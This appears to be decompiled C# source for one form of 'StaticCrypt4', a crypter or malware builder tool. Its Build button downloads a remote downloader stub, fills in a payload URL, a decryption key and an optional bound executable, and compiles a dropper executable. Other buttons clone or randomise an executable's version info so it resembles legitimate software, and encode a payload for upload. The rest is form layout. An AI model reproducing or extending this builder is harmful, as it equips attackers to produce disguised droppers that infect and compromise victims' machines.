using Bunifu.Framework.UI;
using StaticCrypt4.Properties;
using StaticCrypt4.Utilies;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Resources;
using System.Text;
using System.Windows.Forms;
using WindowsFormsControlLibrary1;

namespace StaticCrypt4.Forms
{
	public class ExtraFrm : Form
	{
		private static string _encryptionDownloader = Utiles.RandomString(20);

		private IContainer components;

		public BunifuCustomTextbox bunifuCustomTextbox1;

		public BunifuCustomLabel bunifuCustomLabel1;

		public BunifuFlatButton bunifuFlatButton2;

		public BunifuCustomLabel bunifuCustomLabel2;

		public BunifuCustomTextbox bunifuCustomTextbox2;

		public BunifuFlatButton bunifuFlatButton1;

		public BunifuFlatButton bunifuFlatButton3;

		public BunifuFlatButton bunifuFlatButton4;

		public BunifuCustomTextbox bunifuCustomTextbox3;

		public ChromeRadioButton chromeRadioButton11;

		public ChromeRadioButton chromeRadioButton1;

		public BunifuCustomLabel bunifuCustomLabel3;

		public BunifuCustomLabel bunifuCustomLabel4;

		public ChromeRadioButton chromeRadioButton2;

		public ChromeRadioButton chromeRadioButton3;

		public BunifuCustomLabel bunifuCustomLabel5;

		public BunifuFlatButton bunifuFlatButton5;

		public BunifuCustomTextbox bunifuCustomTextbox4;

		public BunifuCheckbox bunifuCheckbox5;

		public BunifuFlatButton bunifuFlatButton6;

		public ExtraFrm()
		{
			InitializeComponent();
		}

		private void bunifuFlatButton1_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Executable File | *.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					bunifuCustomTextbox2.Text = openFileDialog.FileName;
				}
			}
		}

		private static byte[] RXOR(byte[] data, byte[] key)
		{
			int num = 11;
			int num2 = 13;
			int num3 = 257;
			for (int i = 0; i <= key.Length - 1; i++)
			{
				num3 += num3 % (key[i] + 1);
			}
			byte[] array = new byte[data.Length];
			for (int j = 0; j <= data.Length - 1; j++)
			{
				num3 = key[j % key.Length] + num3;
				num = (num3 + 5) * (num & 0xFF) + (num >> 8);
				num2 = (num3 + 7) * (num2 & 0xFF) + (num2 >> 8);
				num3 = ((num << 8) + num2 & 0xFF);
				array[j] = (byte)(data[j] ^ (byte)num3);
			}
			return array;
		}

		private void bunifuFlatButton4_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Executable File | *.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					bunifuCustomTextbox3.Text = openFileDialog.FileName;
				}
			}
		}

		private void bunifuFlatButton2_Click(object sender, EventArgs e)
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					string text = Utiles.RandomString(10);
					string text2 = Utiles.RandomString(10);
					string text3 = text + ".resources";
					string @string = Encoding.Default.GetString(Convert.FromBase64String(webClient.DownloadString(Utiles.DownloaderStub)));
					@string = @string.Replace("%URL%", Convert.ToBase64String(Encoding.Default.GetBytes(bunifuCustomTextbox1.Text)));
					@string = @string.Replace("%randomfile%", Utiles.RandomString(10));
					@string = @string.Replace("%binder%", bunifuCheckbox5.Checked.ToString());
					@string = @string.Replace("%ResourceName%", text);
					@string = @string.Replace("%keydecrypt%", _encryptionDownloader);
					@string = ((bunifuCustomTextbox4.Text == null) ? @string.Replace("%name%", Utiles.RandomString(10)) : @string.Replace("%name%", Path.GetFileName(bunifuCustomTextbox4.Text)));
					@string = @string.Replace("%ResourceStored%", text2);
					using (SaveFileDialog saveFileDialog = new SaveFileDialog())
					{
						saveFileDialog.Filter = "PE File | *.exe";
						if (saveFileDialog.ShowDialog() == DialogResult.OK)
						{
							if (bunifuCheckbox5.Checked)
							{
								using (ResourceWriter resourceWriter = new ResourceWriter(text3))
								{
									resourceWriter.AddResource(text2, File.ReadAllBytes(bunifuCustomTextbox4.Text));
									resourceWriter.Generate();
								}
								if (chromeRadioButton3.Checked)
								{
									if (Utiles.BuildCode(@string, saveFileDialog.FileName, 2, false, "", text3))
									{
										MessageBox.Show("The downloader was build succefully, it was save as :\n" + saveFileDialog.FileName, "Succes", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
									}
								}
								else if (Utiles.BuildCode(@string, saveFileDialog.FileName, 4, false, "", text3))
								{
									MessageBox.Show("The downloader was build succefully, it was save as :\n" + saveFileDialog.FileName, "Succes", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
								}
							}
							else if (chromeRadioButton3.Checked)
							{
								if (Utiles.BuildCode(@string, saveFileDialog.FileName, 2, false, "", (string[])null))
								{
									MessageBox.Show("The downloader was build succefully, it was save as :\n" + saveFileDialog.FileName, "Succes", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
								}
							}
							else if (Utiles.BuildCode(@string, saveFileDialog.FileName, 4, false, "", (string[])null))
							{
								MessageBox.Show("The downloader was build succefully, it was save as :\n" + saveFileDialog.FileName, "Succes", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error : \n" + ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void bunifuFlatButton3_Click(object sender, EventArgs e)
		{
			if (bunifuCustomTextbox2.Text != "")
			{
				if (chromeRadioButton11.Checked && bunifuCustomTextbox3.Text != "")
				{
					VersionInfo.Clone(bunifuCustomTextbox2.Text, bunifuCustomTextbox3.Text);
				}
				else
				{
					VersionInfo.Random(bunifuCustomTextbox2.Text);
				}
			}
		}

		private void bunifuFlatButton5_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "PE File | *.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					bunifuCustomTextbox4.Text = openFileDialog.FileName;
				}
			}
		}

		private void ExtraFrm_Load(object sender, EventArgs e)
		{
		}

		private void bunifuFlatButton6_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "PE File | *.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					byte[] bytes = Encoding.Default.GetBytes(Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName)));
					File.WriteAllBytes(openFileDialog.FileName + "_encrypted.bin", bytes);
					MessageBox.Show("Your File has been encrypted! Starting now you can upload your file!");
				}
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			bunifuCustomTextbox1 = new BunifuCustomTextbox();
			bunifuCustomLabel1 = new BunifuCustomLabel();
			bunifuFlatButton2 = new BunifuFlatButton();
			bunifuCustomLabel2 = new BunifuCustomLabel();
			bunifuCustomTextbox2 = new BunifuCustomTextbox();
			bunifuFlatButton1 = new BunifuFlatButton();
			bunifuFlatButton3 = new BunifuFlatButton();
			bunifuFlatButton4 = new BunifuFlatButton();
			bunifuCustomTextbox3 = new BunifuCustomTextbox();
			bunifuCustomLabel3 = new BunifuCustomLabel();
			bunifuCustomLabel4 = new BunifuCustomLabel();
			chromeRadioButton1 = new ChromeRadioButton();
			chromeRadioButton11 = new ChromeRadioButton();
			chromeRadioButton2 = new ChromeRadioButton();
			chromeRadioButton3 = new ChromeRadioButton();
			bunifuCustomLabel5 = new BunifuCustomLabel();
			bunifuFlatButton5 = new BunifuFlatButton();
			bunifuCustomTextbox4 = new BunifuCustomTextbox();
			bunifuCheckbox5 = new BunifuCheckbox();
			bunifuFlatButton6 = new BunifuFlatButton();
			base.SuspendLayout();
			bunifuCustomTextbox1.BorderColor = Color.SeaGreen;
			bunifuCustomTextbox1.BorderStyle = BorderStyle.FixedSingle;
			bunifuCustomTextbox1.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomTextbox1.Location = new Point(77, 38);
			bunifuCustomTextbox1.Multiline = true;
			bunifuCustomTextbox1.Name = "bunifuCustomTextbox1";
			bunifuCustomTextbox1.Size = new Size(391, 28);
			bunifuCustomTextbox1.TabIndex = 28;
			bunifuCustomTextbox1.Text = "URL";
			bunifuCustomTextbox1.TextAlign = HorizontalAlignment.Center;
			bunifuCustomLabel1.AutoSize = true;
			bunifuCustomLabel1.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomLabel1.Location = new Point(58, 14);
			bunifuCustomLabel1.Name = "bunifuCustomLabel1";
			bunifuCustomLabel1.Size = new Size(87, 16);
			bunifuCustomLabel1.TabIndex = 66;
			bunifuCustomLabel1.Text = "Downloader :";
			bunifuFlatButton2.Activecolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton2.BackColor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton2.BackgroundImageLayout = ImageLayout.Stretch;
			bunifuFlatButton2.BorderRadius = 0;
			bunifuFlatButton2.ButtonText = " Build";
			bunifuFlatButton2.Cursor = Cursors.Hand;
			bunifuFlatButton2.Iconcolor = Color.Transparent;
//			bunifuFlatButton2.Iconimage = Resources._null;
			bunifuFlatButton2.Iconimage_right = null;
			bunifuFlatButton2.Iconimage_right_Selected = null;
			bunifuFlatButton2.Iconimage_Selected = null;
			bunifuFlatButton2.IconZoom = 1050.0;
			bunifuFlatButton2.IsTab = false;
			bunifuFlatButton2.Location = new Point(77, 169);
			bunifuFlatButton2.Name = "bunifuFlatButton2";
			bunifuFlatButton2.Normalcolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton2.OnHovercolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton2.OnHoverTextColor = Color.White;
			bunifuFlatButton2.selected = false;
			bunifuFlatButton2.Size = new Size(572, 29);
			bunifuFlatButton2.TabIndex = 67;
			bunifuFlatButton2.Textcolor = Color.White;
			bunifuFlatButton2.TextFont = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuFlatButton2.Click += bunifuFlatButton2_Click;
			bunifuCustomLabel2.AutoSize = true;
			bunifuCustomLabel2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomLabel2.Location = new Point(58, 209);
			bunifuCustomLabel2.Name = "bunifuCustomLabel2";
			bunifuCustomLabel2.Size = new Size(138, 16);
			bunifuCustomLabel2.TabIndex = 69;
			bunifuCustomLabel2.Text = "Version Info Changer :";
			bunifuCustomTextbox2.AllowDrop = true;
			bunifuCustomTextbox2.BorderColor = Color.SeaGreen;
			bunifuCustomTextbox2.BorderStyle = BorderStyle.FixedSingle;
			bunifuCustomTextbox2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomTextbox2.Location = new Point(86, 266);
			bunifuCustomTextbox2.Multiline = true;
			bunifuCustomTextbox2.Name = "bunifuCustomTextbox2";
			bunifuCustomTextbox2.Size = new Size(475, 29);
			bunifuCustomTextbox2.TabIndex = 68;
			bunifuCustomTextbox2.TextAlign = HorizontalAlignment.Center;
			bunifuFlatButton1.Activecolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton1.BackColor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton1.BackgroundImageLayout = ImageLayout.Stretch;
			bunifuFlatButton1.BorderRadius = 0;
			bunifuFlatButton1.ButtonText = "...";
			bunifuFlatButton1.Cursor = Cursors.Hand;
			bunifuFlatButton1.Iconcolor = Color.Transparent;
//			bunifuFlatButton1.Iconimage = Resources._null;
			bunifuFlatButton1.Iconimage_right = null;
			bunifuFlatButton1.Iconimage_right_Selected = null;
			bunifuFlatButton1.Iconimage_Selected = null;
			bunifuFlatButton1.IconZoom = 60.0;
			bunifuFlatButton1.IsTab = false;
			bunifuFlatButton1.Location = new Point(576, 266);
			bunifuFlatButton1.Name = "bunifuFlatButton1";
			bunifuFlatButton1.Normalcolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton1.OnHovercolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton1.OnHoverTextColor = Color.White;
			bunifuFlatButton1.selected = false;
			bunifuFlatButton1.Size = new Size(73, 29);
			bunifuFlatButton1.TabIndex = 70;
			bunifuFlatButton1.Textcolor = Color.White;
			bunifuFlatButton1.TextFont = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuFlatButton1.Click += bunifuFlatButton1_Click;
			bunifuFlatButton3.Activecolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton3.BackColor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton3.BackgroundImageLayout = ImageLayout.Stretch;
			bunifuFlatButton3.BorderRadius = 0;
			bunifuFlatButton3.ButtonText = " Change";
			bunifuFlatButton3.Cursor = Cursors.Hand;
			bunifuFlatButton3.Iconcolor = Color.Transparent;
//			bunifuFlatButton3.Iconimage = Resources._null;
			bunifuFlatButton3.Iconimage_right = null;
			bunifuFlatButton3.Iconimage_right_Selected = null;
			bunifuFlatButton3.Iconimage_Selected = null;
			bunifuFlatButton3.IconZoom = 600.0;
			bunifuFlatButton3.IsTab = false;
			bunifuFlatButton3.Location = new Point(275, 376);
			bunifuFlatButton3.Name = "bunifuFlatButton3";
			bunifuFlatButton3.Normalcolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton3.OnHovercolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton3.OnHoverTextColor = Color.White;
			bunifuFlatButton3.selected = false;
			bunifuFlatButton3.Size = new Size(374, 29);
			bunifuFlatButton3.TabIndex = 71;
			bunifuFlatButton3.Textcolor = Color.White;
			bunifuFlatButton3.TextFont = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuFlatButton3.Click += bunifuFlatButton3_Click;
			bunifuFlatButton4.Activecolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton4.BackColor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton4.BackgroundImageLayout = ImageLayout.Stretch;
			bunifuFlatButton4.BorderRadius = 0;
			bunifuFlatButton4.ButtonText = "...";
			bunifuFlatButton4.Cursor = Cursors.Hand;
			bunifuFlatButton4.Iconcolor = Color.Transparent;
//			bunifuFlatButton4.Iconimage = Resources._null;
			bunifuFlatButton4.Iconimage_right = null;
			bunifuFlatButton4.Iconimage_right_Selected = null;
			bunifuFlatButton4.Iconimage_Selected = null;
			bunifuFlatButton4.IconZoom = 60.0;
			bunifuFlatButton4.IsTab = false;
			bunifuFlatButton4.Location = new Point(576, 333);
			bunifuFlatButton4.Name = "bunifuFlatButton4";
			bunifuFlatButton4.Normalcolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton4.OnHovercolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton4.OnHoverTextColor = Color.White;
			bunifuFlatButton4.selected = false;
			bunifuFlatButton4.Size = new Size(73, 29);
			bunifuFlatButton4.TabIndex = 73;
			bunifuFlatButton4.Textcolor = Color.White;
			bunifuFlatButton4.TextFont = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuFlatButton4.Click += bunifuFlatButton4_Click;
			bunifuCustomTextbox3.AllowDrop = true;
			bunifuCustomTextbox3.BorderColor = Color.SeaGreen;
			bunifuCustomTextbox3.BorderStyle = BorderStyle.FixedSingle;
			bunifuCustomTextbox3.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomTextbox3.Location = new Point(86, 333);
			bunifuCustomTextbox3.Multiline = true;
			bunifuCustomTextbox3.Name = "bunifuCustomTextbox3";
			bunifuCustomTextbox3.Size = new Size(475, 29);
			bunifuCustomTextbox3.TabIndex = 72;
			bunifuCustomTextbox3.TextAlign = HorizontalAlignment.Center;
			bunifuCustomLabel3.AutoSize = true;
			bunifuCustomLabel3.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomLabel3.Location = new Point(83, 305);
			bunifuCustomLabel3.Name = "bunifuCustomLabel3";
			bunifuCustomLabel3.Size = new Size(142, 16);
			bunifuCustomLabel3.TabIndex = 76;
			bunifuCustomLabel3.Text = "Version Info To Clone :";
			bunifuCustomLabel4.AutoSize = true;
			bunifuCustomLabel4.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomLabel4.Location = new Point(83, 239);
			bunifuCustomLabel4.Name = "bunifuCustomLabel4";
			bunifuCustomLabel4.Size = new Size(36, 16);
			bunifuCustomLabel4.TabIndex = 77;
			bunifuCustomLabel4.Text = "File :";
			chromeRadioButton1.Checked = false;
			chromeRadioButton1.Customization = "AAAA////////////AAAA/wAAAP8=";
			chromeRadioButton1.Field = 23;
			chromeRadioButton1.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			chromeRadioButton1.Image = null;
			chromeRadioButton1.Location = new Point(166, 379);
			chromeRadioButton1.Name = "chromeRadioButton1";
			chromeRadioButton1.NoRounding = false;
			chromeRadioButton1.Size = new Size(95, 23);
			chromeRadioButton1.TabIndex = 75;
			chromeRadioButton1.Text = "Random";
			chromeRadioButton1.Transparent = false;
			chromeRadioButton11.Checked = false;
			chromeRadioButton11.Customization = "AAAA////////////AAAA/wAAAP8=";
			chromeRadioButton11.Field = 23;
			chromeRadioButton11.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			chromeRadioButton11.Image = null;
			chromeRadioButton11.Location = new Point(86, 379);
			chromeRadioButton11.Name = "chromeRadioButton11";
			chromeRadioButton11.NoRounding = false;
			chromeRadioButton11.Size = new Size(95, 23);
			chromeRadioButton11.TabIndex = 74;
			chromeRadioButton11.Text = "Clone";
			chromeRadioButton11.Transparent = false;
			chromeRadioButton2.Checked = false;
			chromeRadioButton2.Customization = "AAAA////////////AAAA/wAAAP8=";
			chromeRadioButton2.Field = 23;
			chromeRadioButton2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			chromeRadioButton2.Image = null;
			chromeRadioButton2.Location = new Point(211, 138);
			chromeRadioButton2.Name = "chromeRadioButton2";
			chromeRadioButton2.NoRounding = false;
			chromeRadioButton2.Size = new Size(125, 23);
			chromeRadioButton2.TabIndex = 79;
			chromeRadioButton2.Text = "Frameworks 4.0";
			chromeRadioButton2.Transparent = false;
			chromeRadioButton3.Checked = false;
			chromeRadioButton3.Customization = "AAAA////////////AAAA/wAAAP8=";
			chromeRadioButton3.Field = 23;
			chromeRadioButton3.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			chromeRadioButton3.Image = null;
			chromeRadioButton3.Location = new Point(77, 138);
			chromeRadioButton3.Name = "chromeRadioButton3";
			chromeRadioButton3.NoRounding = false;
			chromeRadioButton3.Size = new Size(119, 23);
			chromeRadioButton3.TabIndex = 78;
			chromeRadioButton3.Text = "Frameworks 2.0";
			chromeRadioButton3.Transparent = false;
			bunifuCustomLabel5.AutoSize = true;
			bunifuCustomLabel5.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomLabel5.Location = new Point(102, 75);
			bunifuCustomLabel5.Name = "bunifuCustomLabel5";
			bunifuCustomLabel5.Size = new Size(78, 16);
			bunifuCustomLabel5.TabIndex = 82;
			bunifuCustomLabel5.Text = "Bind A File :";
			bunifuFlatButton5.Activecolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton5.BackColor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton5.BackgroundImageLayout = ImageLayout.Stretch;
			bunifuFlatButton5.BorderRadius = 0;
			bunifuFlatButton5.ButtonText = "...";
			bunifuFlatButton5.Cursor = Cursors.Hand;
			bunifuFlatButton5.Iconcolor = Color.Transparent;
//			bunifuFlatButton5.Iconimage = Resources._null;
			bunifuFlatButton5.Iconimage_right = null;
			bunifuFlatButton5.Iconimage_right_Selected = null;
			bunifuFlatButton5.Iconimage_Selected = null;
			bunifuFlatButton5.IconZoom = 60.0;
			bunifuFlatButton5.IsTab = false;
			bunifuFlatButton5.Location = new Point(567, 101);
			bunifuFlatButton5.Name = "bunifuFlatButton5";
			bunifuFlatButton5.Normalcolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton5.OnHovercolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton5.OnHoverTextColor = Color.White;
			bunifuFlatButton5.selected = false;
			bunifuFlatButton5.Size = new Size(73, 29);
			bunifuFlatButton5.TabIndex = 81;
			bunifuFlatButton5.Textcolor = Color.White;
			bunifuFlatButton5.TextFont = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuFlatButton5.Click += bunifuFlatButton5_Click;
			bunifuCustomTextbox4.AllowDrop = true;
			bunifuCustomTextbox4.BorderColor = Color.SeaGreen;
			bunifuCustomTextbox4.BorderStyle = BorderStyle.FixedSingle;
			bunifuCustomTextbox4.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomTextbox4.Location = new Point(77, 101);
			bunifuCustomTextbox4.Multiline = true;
			bunifuCustomTextbox4.Name = "bunifuCustomTextbox4";
			bunifuCustomTextbox4.Size = new Size(475, 29);
			bunifuCustomTextbox4.TabIndex = 80;
			bunifuCustomTextbox4.TextAlign = HorizontalAlignment.Center;
			bunifuCheckbox5.BackColor = Color.SeaGreen;
			bunifuCheckbox5.ChechedOffColor = Color.SeaGreen;
			bunifuCheckbox5.Checked = false;
			bunifuCheckbox5.CheckedOnColor = Color.SeaGreen;
			bunifuCheckbox5.ForeColor = Color.White;
			bunifuCheckbox5.Location = new Point(77, 74);
			bunifuCheckbox5.Name = "bunifuCheckbox5";
			bunifuCheckbox5.Size = new Size(20, 20);
			bunifuCheckbox5.TabIndex = 83;
			bunifuFlatButton6.Activecolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton6.BackColor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton6.BackgroundImageLayout = ImageLayout.Stretch;
			bunifuFlatButton6.BorderRadius = 0;
			bunifuFlatButton6.ButtonText = "Encrypt Your File";
			bunifuFlatButton6.Cursor = Cursors.Hand;
			bunifuFlatButton6.Iconcolor = Color.Transparent;
//			bunifuFlatButton6.Iconimage = Resources._null;
			bunifuFlatButton6.Iconimage_right = null;
			bunifuFlatButton6.Iconimage_right_Selected = null;
			bunifuFlatButton6.Iconimage_Selected = null;
			bunifuFlatButton6.IconZoom = 50.0;
			bunifuFlatButton6.IsTab = false;
			bunifuFlatButton6.Location = new Point(474, 38);
			bunifuFlatButton6.Name = "bunifuFlatButton6";
			bunifuFlatButton6.Normalcolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton6.OnHovercolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton6.OnHoverTextColor = Color.White;
			bunifuFlatButton6.selected = false;
			bunifuFlatButton6.Size = new Size(166, 29);
			bunifuFlatButton6.TabIndex = 84;
			bunifuFlatButton6.Textcolor = Color.White;
			bunifuFlatButton6.TextFont = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuFlatButton6.Click += bunifuFlatButton6_Click;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			BackColor = Color.White;
			base.ClientSize = new Size(710, 426);
			base.Controls.Add(bunifuFlatButton6);
			base.Controls.Add(bunifuCheckbox5);
			base.Controls.Add(bunifuCustomLabel5);
			base.Controls.Add(bunifuFlatButton5);
			base.Controls.Add(bunifuCustomTextbox4);
			base.Controls.Add(chromeRadioButton2);
			base.Controls.Add(chromeRadioButton3);
			base.Controls.Add(bunifuCustomLabel4);
			base.Controls.Add(bunifuCustomLabel3);
			base.Controls.Add(chromeRadioButton1);
			base.Controls.Add(chromeRadioButton11);
			base.Controls.Add(bunifuFlatButton4);
			base.Controls.Add(bunifuCustomTextbox3);
			base.Controls.Add(bunifuFlatButton3);
			base.Controls.Add(bunifuFlatButton1);
			base.Controls.Add(bunifuCustomLabel2);
			base.Controls.Add(bunifuCustomTextbox2);
			base.Controls.Add(bunifuFlatButton2);
			base.Controls.Add(bunifuCustomLabel1);
			base.Controls.Add(bunifuCustomTextbox1);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Name = "ExtraFrm";
			Text = "ExtraFrm";
			base.Load += ExtraFrm_Load;
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
